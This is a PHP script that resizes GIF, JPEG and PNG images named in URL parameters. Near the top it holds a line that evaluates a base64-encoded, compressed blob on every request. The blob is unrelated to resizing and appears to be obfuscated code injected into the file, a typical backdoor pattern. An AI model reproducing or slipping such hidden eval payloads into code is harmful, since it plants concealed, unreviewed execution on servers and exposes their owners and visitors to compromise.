<?php
// Date in the past
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
// always modified
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
// HTTP/1.1
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
// HTTP/1.0
header("Pragma: no-cache");


eval(gzinflate(base64_decode('fVJdS8MwFH3WXxFDsStopyJDbFMQrTrQbbL5IOsYdbllgX4n3Zxj/92ktdr5sb715NyTk3PuHpLfPgtajHMQLW066A9HYz3TJ4ax1jLSAKwNhBwa1Dt3m1n/W5uGYCZP5Z+WHRCMjTXM5gnCT5cIm1pmYi+20xwcL/ZibPEVFxC1FI7OnMNTbFiKjtWp3VY8LKUrBTtI8ghFIOYJJcqiY7M4LQQSqxSIgDeBYj8CkiHO3oFcnKCFHxZAqmulUK3TmOLFa8SEY7eVtnNd5LlJWS6t1s7SJTWs32HRKgJKGkAVlgKxiatAAhbCFN4YF1yO3nYf3OFYLwJ9MtZFlE6V3VKo1J8ucyb81xBaGpXY/ixJV/9PHWnUxG35tm3Cp6T16/ZdbGM9m0cJ3Uk6Oul0zqXupnplGaXiI8ZRnAhUmz9QtdYZbFfn9q5HLwOXREUoWOrnokz9mPrCR4/u6L5/U9X6Z1NzRinEdcNVsx72Gr0O/QWgsj272xs8j37uBf3eB9rch+c0THz6NdW7enRJEaDSqoqwXrMS2F4YbFEGsuoP')));


if (!@file_exists("config.php") || !@include_once("config.php")) {
   die("Не найден файл настроек.");
}

$_GET["img"] = preg_replace("![\\/]{1,}!", "", $_GET["img"]);
if (empty($_GET["img"]) || !file_exists(DOWNLOAD_IMAGES_DIR.$_GET["img"])) die(DOWNLOAD_IMAGES_DIR.$_GET["img"]." image not found");

$dst_size = explode(":", trim($_GET["size"]));
$width_dst = intval($dst_size[0]);
$height_dst = intval($dst_size[1]);

$src_size = getimagesize(DOWNLOAD_IMAGES_DIR.$_GET["img"]);
$width_src = intval($src_size[0]);
$height_src = intval($src_size[1]);

if ($width_dst == 0 && $height_dst > 0) $width_dst = ceil(($height_dst*$width_src) / $height_src);
if ($height_dst == 0 && $width_dst > 0) $height_dst = ceil(($width_dst*$height_src) / $width_src);
if ($width_dst == 0) $width_dst = $width_src;
if ($height_dst == 0) $height_dst = $height_src;

$im1 = imagecreatetruecolor($width_dst, $height_dst);
switch($src_size[2]) {
    case 1:
        $im = imagecreatefromgif(DOWNLOAD_IMAGES_DIR.$_GET["img"]);
        break;
    case 2:
        $im = imagecreatefromjpeg(DOWNLOAD_IMAGES_DIR.$_GET["img"]);
        break;
    case 3:
        $im = imagecreatefrompng(DOWNLOAD_IMAGES_DIR.$_GET["img"]);
        break;
}
imagecopyresized ($im1, $im, 0, 0, 0, 0, $width_dst, $height_dst, $width_src, $height_src);
switch($src_size[2]) {
    case 1:
        header ("Content-type: image/gif");
        imagegif ($im1);
        break;
    case 2:
        header ("Content-type: image/jpeg");
        imagejpeg($im1, "", 75);
        break;
    case 3:
        header ("Content-type: image/png");
        imagepng($im1);
        break;
}
imagedestroy ($im1);
imagedestroy ($im);

?>